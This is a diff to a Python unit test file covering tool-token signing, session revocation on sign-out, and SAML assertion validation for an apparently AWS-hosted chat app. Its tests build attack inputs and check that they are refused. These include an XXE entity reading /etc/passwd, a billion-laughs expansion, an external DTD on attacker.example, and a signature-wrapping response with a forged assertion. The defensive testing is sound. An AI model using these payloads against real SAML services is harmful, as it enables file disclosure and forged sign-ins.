@@ -1,21 +1,27 @@
 """Unit tests for sign-in and authorization: tokens (tools/common/tokens.py), the tool Lambdas' caller checks
-(tools/common/caller.py) and SAML assertion validation (web/auth.py; skipped unless signxml and lxml are installed).
-No AWS calls: secrets, QuickSight and DynamoDB are replaced by stubs."""
+(tools/common/caller.py), SAML assertion validation (web/auth.py) and sign-out (web/handler.py); the last two are
+skipped unless signxml and lxml are installed. No AWS calls: secrets, QuickSight, DynamoDB and the Runtime are stubs."""
 
 import base64
 import datetime as dt
+import importlib.util
+import io
+import json
 import os
 import sys
 import time
 import unittest
+import urllib.parse
 import uuid
+import zlib
 
 ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 for sub in ("tools/common", "web"):
     sys.path.insert(0, os.path.join(ROOT, sub))
 for key, value in (("ACCOUNT_ID", "1"), ("QS_REGION", "cn-north-1"), ("AWS_REGION", "cn-north-1"),
-                   ("SESSION_SECRET_ID", "x"), ("SAML_SP_ENTITY_ID", "urn:example:chat"),
-                   ("IDP_METADATA_PARAMETER", "/example/idp-metadata")):
+                   ("SESSION_SECRET_ID", "x"), ("TOOL_SECRET_ID", "y"), ("SAML_SP_ENTITY_ID", "urn:example:chat"),
+                   ("IDP_METADATA_PARAMETER", "/example/idp-metadata"), ("RUNTIME_ARN", "arn:example:runtime/r"),
+                   ("JOBS_TABLE", "jobs"), ("ANALYSIS_TOOLS_FN", "analysis-tools")):
     os.environ.setdefault(key, value)
 
 import jwt  # noqa: E402
@@ -24,7 +30,8 @@ import caller  # noqa: E402
 import tokens  # noqa: E402
 
 SECRET = "s" * 64
-KEY = tokens.signing_key(SECRET)
+KEY = tokens.signing_key(SECRET)  # session-key
+TOOL_KEY = tokens.signing_key("t" * 64)  # tool-key
 
 
 class TokensTest(unittest.TestCase):
@@ -86,10 +93,27 @@ class TokensTest(unittest.TestCase):
 class CallerTest(unittest.TestCase):
     def setUp(self):
         caller._cache.clear()
-        caller._cache["session-key"] = (time.time(), KEY)
+        caller._cache["tool-key"] = (time.time(), TOOL_KEY)
+        caller.revocation_check = None
 
-    def tool(self, analysis, sub="a@example.com", seconds=60):
-        return tokens.mint(KEY, tokens.TOOLS_AUDIENCE, sub, seconds, analysis=analysis)[0]
+    def tool(self, analysis, sub="a@example.com", seconds=60, key=TOOL_KEY, **claims):
+        return tokens.mint(key, tokens.TOOLS_AUDIENCE, sub, seconds, analysis=analysis, **{"sid": "s1", **claims})[0]
+
+    def test_tool_token_needs_the_tool_key_and_a_session(self):
+        for token in (self.tool("a1", key=KEY),  # a tool token signed with the session key
+                      tokens.mint(TOOL_KEY, tokens.TOOLS_AUDIENCE, "a@example.com", 60, analysis="a1")[0],  # no sid
+                      self.tool("a1", sid="")):
+            with self.assertRaisesRegex(caller.ToolError, "用户身份校验失败"):
+                caller.verify_token(token, "a1")
+
+    def test_signed_out_session_is_refused(self):
+        try:
+            caller.revocation_check = lambda sid: sid == "s1"
+            with self.assertRaisesRegex(caller.ToolError, "已退出登录"):
+                caller.verify_token(self.tool("a1"), "a1")
+            self.assertEqual(caller.verify_token(self.tool("a1", sid="s2"), "a1"), "a@example.com")
+        finally:
+            caller.revocation_check = None
 
     def test_tool_token_is_bound_to_its_analysis(self):
         self.assertEqual(caller.verify_token(self.tool("a1"), "a1"), "a@example.com")
@@ -143,7 +167,8 @@ try:
     from cryptography.hazmat.primitives import hashes, serialization
     from cryptography.hazmat.primitives.asymmetric import rsa
     from cryptography.x509.oid import NameOID
-    from lxml import etree
+    # Test fixture: builds and signs its own XML (SignXML requires lxml).
+    from lxml import etree  # nosec B410
     from signxml import XMLSigner
     import auth
 except ImportError as missing:  # signxml / lxml are only in the web Lambda package
@@ -182,6 +207,18 @@ class FakeTable:
         item = self.items.get(Key["jobId"])
         return {"Item": item} if item else {}
 
+    def update_item(self, Key, UpdateExpression, ConditionExpression=None, ExpressionAttributeNames=None,  # noqa: N803
+                    ExpressionAttributeValues=None, **_):
+        """SET a = :v, ... honouring the "#s = :running" condition of the web Lambda's cancel()."""
+        names, values = ExpressionAttributeNames or {}, ExpressionAttributeValues or {}
+        item = self.items.setdefault(Key["jobId"], dict(Key))
+        if ConditionExpression == "#s = :running" and item.get("status") != values[":running"]:
+            raise self._Exceptions.ConditionalCheckFailedException()
+        for part in UpdateExpression.removeprefix("SET ").split(","):
+            name, value = (x.strip() for x in part.split("="))
+            item[names.get(name, name)] = values[value]
+        return {}
+
     def delete_item(self, Key, ReturnValues=None, ConditionExpression=None):  # noqa: N803
         if Key["jobId"] not in self.items:
             raise self._Exceptions.ConditionalCheckFailedException()
@@ -196,32 +233,57 @@ class SamlTest(unittest.TestCase):
     @classmethod
     def setUpClass(cls):
         cls.old, cls.new, cls.stranger = _keypair("old"), _keypair("new"), _keypair("stranger")
-        auth._session_key = KEY
+        auth._session_key, auth._tool_signing_key = KEY, TOOL_KEY
         auth.directory_name = lambda email: ""
         auth._idp.update(at=time.time() + 10**6, value=(cls.IDP, "https://idp.example.com/sso",
                                                         [cls.old[1].decode(), cls.new[1].decode()]))
 
-    def response(self, request_id, signer, assertion_id="_a"):
+    def assertion(self, request_id, assertion_id="_a", audience=None, recipient=None, in_response_to=None,
+                  subject="Alex@Example.com"):
         now = dt.datetime.now(dt.timezone.utc)
         fmt = lambda t: t.strftime("%Y-%m-%dT%H:%M:%SZ")  # noqa: E731
         ns = auth.NS
         id_attribute = f' ID="{assertion_id}"' if assertion_id else ""
-        assertion = etree.fromstring(
+        # Test fixture: parses the XML it just built.
+        return etree.fromstring(  # nosec B320
             f'<saml:Assertion xmlns:saml="{ns["saml"]}"{id_attribute} Version="2.0" IssueInstant="{fmt(now)}">'
-            f"<saml:Issuer>{self.IDP}</saml:Issuer><saml:Subject><saml:NameID>Alex@Example.com</saml:NameID>"
+            f"<saml:Issuer>{self.IDP}</saml:Issuer><saml:Subject><saml:NameID>{subject}</saml:NameID>"
             f'<saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer"><saml:SubjectConfirmationData '
-            f'InResponseTo="{request_id}" Recipient="{self.ACS}" NotOnOrAfter="{fmt(now + dt.timedelta(minutes=5))}"/>'
+            f'InResponseTo="{in_response_to or request_id}" Recipient="{recipient or self.ACS}" '
+            f'NotOnOrAfter="{fmt(now + dt.timedelta(minutes=5))}"/>'
             f"</saml:SubjectConfirmation></saml:Subject><saml:Conditions NotBefore=\"{fmt(now)}\" "
             f'NotOnOrAfter="{fmt(now + dt.timedelta(minutes=5))}"><saml:AudienceRestriction>'
-            f"<saml:Audience>{auth.SP_ENTITY_ID}</saml:Audience></saml:AudienceRestriction></saml:Conditions>"
+            f"<saml:Audience>{audience or auth.SP_ENTITY_ID}</saml:Audience></saml:AudienceRestriction></saml:Conditions>"
             f"</saml:Assertion>")
-        signed = XMLSigner(c14n_algorithm="http://www.w3.org/2001/10/xml-exc-c14n#").sign(
-            assertion, key=signer[0], cert=signer[1])
-        root = etree.fromstring(f'<samlp:Response xmlns:samlp="{ns["samlp"]}" ID="_r" Version="2.0">'
+
+    def response(self, request_id, signer, assertion_id="_a", audience=None, recipient=None, in_response_to=None,
+                 sign=True, prefix=b"", wrap=False, count=1):
+        """A base64 SAMLResponse. prefix: bytes put before the XML (a DOCTYPE); wrap: the signed assertion moved into
+        samlp:Extensions with a forged unsigned assertion in its place; count: number of signed assertions."""
+        ns = auth.NS
+        # Test fixture: parses the XML it just built.
+        root = etree.fromstring(f'<samlp:Response xmlns:samlp="{ns["samlp"]}" ID="_r" Version="2.0">'  # nosec B320
                                 f'<samlp:Status><samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>'
                                 f"</samlp:Status></samlp:Response>")
-        root.append(signed)
-        return base64.b64encode(etree.tostring(root)).decode()
+        for i in range(count):
+            assertion = self.assertion(request_id, assertion_id + (str(i) if i else ""), audience, recipient,
+                                       in_response_to)
+            if sign:
+                assertion = XMLSigner(c14n_algorithm="http://www.w3.org/2001/10/xml-exc-c14n#").sign(
+                    assertion, key=signer[0], cert=signer[1])
+            if wrap:
+                etree.SubElement(root, etree.QName(ns["samlp"], "Extensions")).append(assertion)
+                root.append(self.assertion(request_id, "_forged", subject="mallory@example.com"))
+            else:
+                root.append(assertion)
+        return base64.b64encode(prefix + etree.tostring(root)).decode()
+
+    def refused(self, message, **kwargs):
+        table = FakeTable()
+        request_id = self.start(table)
+        with self.assertRaisesRegex(auth.AuthError, message):
+            auth.complete_login(table, self.response(request_id, self.old, "_" + uuid.uuid4().hex, **kwargs),
+                                request_id, self.ACS)
 
     def start(self, table):
         auth.login_redirect(table, "n" * 32, self.ACS)
@@ -258,8 +320,112 @@ class SamlTest(unittest.TestCase):
         self.assertIsNotNone(auth.verify_session(token, table))
         auth.revoke_session(table, claims)
         self.assertIsNone(auth.verify_session(token, table))
-        tool = auth.mint_tool_token("alex@example.com", "a1", 60)
+        tool = auth.mint_tool_token("alex@example.com", "a1", 60, sid=claims["jti"])
         self.assertIsNone(auth.verify_session(tool, table))  # a tool token is not a sign-in
+        self.assertEqual(tokens.verify(TOOL_KEY, tool, tokens.TOOLS_AUDIENCE)["sid"], claims["jti"])
+        with self.assertRaises(tokens.InvalidToken):  # signed with the tool key, not the session key
+            tokens.verify(KEY, tool, tokens.TOOLS_AUDIENCE)
+
+    def test_rejects_doctype_external_entities_and_entity_expansion(self):
+        xxe = b'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>'
+        laughs = b'<!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]>'
+        for prefix in (xxe, laughs, b'<!doctype r SYSTEM "http://attacker.example/x.dtd">'):
+            self.refused("DOCTYPE", prefix=prefix)
+        utf16 = '<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE r [<!ENTITY x "y">]><r>&x;</r>'.encode("utf-16")
+        with self.assertRaises(auth.UnsafeXml):  # the byte check cannot see it; the parsed docinfo does
+            auth._parse_xml(utf16)
+        metadata = (b'<!DOCTYPE m [<!ENTITY x SYSTEM "file:///etc/passwd">]>'
+                    b'<md:EntityDescriptor xmlns:md="urn:oasis:names:tc:SAML:2.0:metadata" entityID="&x;"/>')
+        with self.assertRaisesRegex(RuntimeError, "DOCTYPE"):
+            auth.parse_idp_metadata(metadata)
+
+    def test_rejects_two_assertions_wrapping_and_unsigned(self):
+        self.refused("exactly one", count=2)
+        self.refused("not signed", wrap=True)  # signature wrapping: the signed assertion is not the one read
+        self.refused("not signed", sign=False)
+
+    def test_rejects_wrong_audience_recipient_and_request(self):
+        self.refused("audience mismatch", audience="urn:example:other-app")
+        self.refused("bearer confirmation", recipient="https://evil.example.com/saml/acs")
+        self.refused("bearer confirmation", in_response_to="_" + uuid.uuid4().hex)
+
+    def test_authn_request_is_built_as_xml(self):
+        table = FakeTable()
+        acs = 'https://chat.example.com/saml/acs?x=1&y="<z>'
+        location = auth.login_redirect(table, "n" * 32, acs)
+        self.assertTrue(location.startswith("https://idp.example.com/sso?SAMLRequest="))
+        query = urllib.parse.parse_qs(urllib.parse.urlsplit(location).query)
+        xml = zlib.decompress(base64.b64decode(query["SAMLRequest"][0]), -15)
+        # Test fixture: parses the request the code under test just built.
+        request = etree.fromstring(xml)  # nosec B320
+        self.assertEqual(request.tag, f"{{{auth.NS['samlp']}}}AuthnRequest")
+        self.assertEqual(request.get("ID"), query["RelayState"][0])
+        self.assertEqual(request.get("AssertionConsumerServiceURL"), acs)
+        self.assertEqual(request.findtext("saml:Issuer", namespaces=auth.NS), auth.SP_ENTITY_ID)
+        self.assertIn(f"saml#{request.get('ID')}", table.items)
+
+
+class _Runtime:
+    """The AgentCore Runtime client of the web Lambda: acknowledges jobs and cancel signals."""
+
+    def __init__(self):
+        self.payloads = []
+
+    def invoke_agent_runtime(self, **kwargs):
+        self.payloads.append(json.loads(kwargs["payload"]))
+        return {"response": io.BytesIO(json.dumps({"accepted": True, "cancelled": True}).encode())}
+
+
+@unittest.skipIf(auth is None, "" if auth else SKIP)
+class WebLogoutTest(unittest.TestCase):
+    """Sign-out revokes the session, cancels its running answers, and its tool tokens stop working."""
+
+    @classmethod
+    def setUpClass(cls):
+        spec = importlib.util.spec_from_file_location("web_handler", os.path.join(ROOT, "web", "handler.py"))
+        cls.web = importlib.util.module_from_spec(spec)
+        spec.loader.exec_module(cls.web)
+
+    def setUp(self):
+        auth._session_key, auth._tool_signing_key = KEY, TOOL_KEY
+        self.table, self.runtime = FakeTable(), _Runtime()
+        self.web.jobs, self.web.agentcore = self.table, self.runtime
+        self.token, self.claims = auth.mint_session("alex@example.com", "Alex")
+
+    def call(self, method, path, body=None):
+        return self.web.handler({"requestContext": {"http": {"method": method}, "domainName": "chat.example.com"},
+                                 "rawPath": path, "headers": {"authorization": f"Bearer {self.token}"},
+                                 "body": json.dumps(body) if body is not None else ""}, None)
+
+    def test_logout_cancels_running_jobs_and_revokes_tool_tokens(self):
+        ids = [json.loads(self.call("POST", "/chat", {"prompt": "趋势", "analysis": "a1"})["body"])["jobId"]
+               for _ in range(2)]
+        jti = self.claims["jti"]
+        self.assertEqual([self.table.items[i]["sid"] for i in ids], [jti, jti])
+        tool_tokens = [p["auth"] for p in self.runtime.payloads]
+        self.assertEqual([tokens.verify(TOOL_KEY, t, tokens.TOOLS_AUDIENCE)["sid"] for t in tool_tokens], [jti, jti])
+        self.assertEqual(self.table.items[f"sessjobs#{jti}"]["jobIds"], ids)
+
+        out = self.call("POST", "/auth/logout", {})
+        self.assertEqual((out["statusCode"], json.loads(out["body"])["cancelled"]), (200, 2))
+        self.assertEqual([self.table.items[i]["status"] for i in ids], ["CANCELLED", "CANCELLED"])
+        # the record outlives the job tool tokens (8 h), not just the 1-hour session token
+        self.assertGreaterEqual(self.table.items[f"revoked#{jti}"]["expiresAt"],
+                                int(time.time()) + self.web.JOB_TOKEN_SECONDS)
+        self.assertEqual(self.call("GET", "/me")["statusCode"], 401)
+        try:  # the analysis tools' hook (tools/analysis/handler.py) reads the same revoked# record
+            caller._cache["tool-key"] = (time.time(), TOOL_KEY)
+            caller.revocation_check = lambda sid: bool(self.table.get_item(Key={"jobId": f"revoked#{sid}"}).get("Item"))
+            with self.assertRaisesRegex(caller.ToolError, "已退出登录"):
+                caller.verify_token(tool_tokens[0], "a1")
+        finally:
+            caller.revocation_check = None
+
+    def test_remembers_the_newest_jobs_only(self):
+        for i in range(self.web.SESSION_JOBS_MAX + 5):
+            self.web._remember_job(self.claims, f"{i:032x}")
+        ids = self.table.items[f"sessjobs#{self.claims['jti']}"]["jobIds"]
+        self.assertEqual(ids, [f"{i:032x}" for i in range(5, self.web.SESSION_JOBS_MAX + 5)])
 
 
 if __name__ == "__main__":
